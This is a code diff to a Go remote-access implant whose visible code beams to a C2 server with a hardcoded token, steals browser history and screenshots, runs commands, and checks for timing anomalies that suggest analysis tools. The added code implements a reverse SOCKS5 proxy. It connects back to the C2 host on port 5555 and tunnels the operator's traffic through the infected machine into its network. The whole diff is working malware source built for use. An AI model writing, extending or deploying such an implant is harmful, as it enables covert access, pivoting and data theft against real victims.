@@ -6,6 +6,7 @@ import (
     "crypto/tls"
     "encoding/base64"
     "encoding/json"
+    "encoding/binary"
     "fmt"
     "github.com/kbinani/screenshot"
     "image/png"
@@ -13,6 +14,7 @@ import (
     "log"
     "net"
     "net/http"
+    "net/url"
     "os/exec"
     "os"
     "os/user"
@@ -26,9 +28,15 @@ import (
 )
 
 var (
+    proxyActive   bool
+    proxyStopChan chan struct{}
+    proxyLock     sync.Mutex
+)
+
+var (
     mu               sync.Mutex
     isCommandRunning bool
-    serverURL        = "https://192.168.56.101:5000"
+    serverURL        = "http://192.168.56.101:5000"
     bearerToken      = "Azerty112345678"
 )
 
@@ -245,6 +253,12 @@ func executeCommandAndSendResult(cmd Command) {
         }
     case cmd.Cmd == "browser_history":
         checkBrowserHistories(cmd)
+    case cmd.Cmd == "reverse_proxy_start":
+         go startReverseProxy()
+         sendResult(CommandResult{ID: cmd.ID, Result: "[+] Reverse proxy started."})
+    case cmd.Cmd == "reverse_proxy_stop":
+         stopReverseProxy()
+         sendResult(CommandResult{ID: cmd.ID, Result: "[+] Reverse proxy stop signal sent."})
     default:
         executeOtherCommand(cmd)
     }
@@ -669,4 +683,138 @@ func checkTimingAnomaly() bool {
         duration := time.Since(start)
         return duration > 80*time.Millisecond
 }
-       
+
+// startReverseProxy connects back to the C2 host (serverURL) on TCP:5555
+// and behaves as a SOCKS5 proxy for proxychains-style clients.
+// handleSOCKS5 implements a minimal SOCKS5 handshake + CONNECT command.
+func handleSOCKS5(serverConn net.Conn) {
+        buf := make([]byte, 262)
+
+        // ---- Greeting ----
+        n, err := io.ReadFull(serverConn, buf[:2])
+        if err != nil || n < 2 {
+                log.Printf("[-] SOCKS5 greeting read failed: %v", err)
+                return
+        }
+        nMethods := int(buf[1])
+        _, err = io.ReadFull(serverConn, buf[:nMethods]) // read methods
+        if err != nil {
+                log.Printf("[-] SOCKS5 methods read failed: %v", err)
+                return
+        }
+        // reply: version 5, no authentication (0x00)
+        serverConn.Write([]byte{0x05, 0x00})
+
+        // ---- Request ----
+        n, err = io.ReadFull(serverConn, buf[:4])
+        if err != nil || n < 4 {
+                log.Printf("[-] SOCKS5 request header failed: %v", err)
+                return
+        }
+        cmd := buf[1]
+        addrType := buf[3]
+        if cmd != 0x01 { // only CONNECT
+                serverConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+                return
+        }
+
+        var dstAddr string
+        switch addrType {
+        case 0x01: // IPv4
+                _, err = io.ReadFull(serverConn, buf[:4])
+                if err != nil {
+                        return
+                }
+                ip := net.IPv4(buf[0], buf[1], buf[2], buf[3]).String()
+                io.ReadFull(serverConn, buf[:2])
+                port := binary.BigEndian.Uint16(buf[:2])
+                dstAddr = fmt.Sprintf("%s:%d", ip, port)
+        case 0x03: // Domain
+                io.ReadFull(serverConn, buf[:1])
+                dlen := int(buf[0])
+                io.ReadFull(serverConn, buf[:dlen+2])
+                domain := string(buf[:dlen])
+                port := binary.BigEndian.Uint16(buf[dlen : dlen+2])
+                dstAddr = fmt.Sprintf("%s:%d", domain, port)
+        default:
+                serverConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+                return
+        }
+
+        log.Printf("[*] SOCKS5 connect request → %s", dstAddr)
+        targetConn, err := net.Dial("tcp", dstAddr)
+        if err != nil {
+                log.Printf("[-] Unable to connect to %s: %v", dstAddr, err)
+                serverConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+                return
+        }
+
+        // success reply
+        serverConn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
+
+        // ---- Relay traffic ----
+        go io.Copy(targetConn, serverConn)
+        io.Copy(serverConn, targetConn)
+        targetConn.Close()
+}
+
+// startReverseProxy connects back to the C2 host (serverURL) and acts as a SOCKS5 bridge.
+// It listens for a stop signal on proxyStopChan to end gracefully.
+func startReverseProxy() {
+    proxyLock.Lock()
+    if proxyActive {
+        log.Println("[!] Reverse proxy already active.")
+        proxyLock.Unlock()
+        return
+    }
+    proxyActive = true
+    proxyStopChan = make(chan struct{})
+    proxyLock.Unlock()
+
+    parsed, err := url.Parse(serverURL)
+    if err != nil {
+        log.Printf("[-] reverse_proxy: cannot parse serverURL: %v", err)
+        return
+    }
+
+    host := parsed.Host
+    if strings.Contains(host, ":") {
+        host = strings.Split(host, ":")[0]
+    }
+    remoteAddr := net.JoinHostPort(host, "5555")
+
+    log.Printf("[*] reverse_proxy: connecting to %s ...", remoteAddr)
+    conn, err := net.Dial("tcp", remoteAddr)
+    if err != nil {
+        log.Printf("[-] reverse_proxy: failed to connect: %v", err)
+        proxyLock.Lock()
+        proxyActive = false
+        proxyLock.Unlock()
+        return
+    }
+    log.Printf("[+] reverse_proxy: connected to %s", remoteAddr)
+
+    // Handle SOCKS5 and traffic forwarding in a separate goroutine
+    go handleSOCKS5(conn)
+
+    // Monitor stop signal
+    <-proxyStopChan
+    log.Println("[*] reverse_proxy: stop signal received.")
+    conn.Close()
+
+    proxyLock.Lock()
+    proxyActive = false
+    proxyLock.Unlock()
+    log.Println("[+] reverse_proxy: stopped.")
+}
+
+func stopReverseProxy() {
+    proxyLock.Lock()
+    defer proxyLock.Unlock()
+    if proxyActive && proxyStopChan != nil {
+        close(proxyStopChan)
+    } else {
+        log.Println("[-] reverse_proxy: not active.")
+    }
+}
+
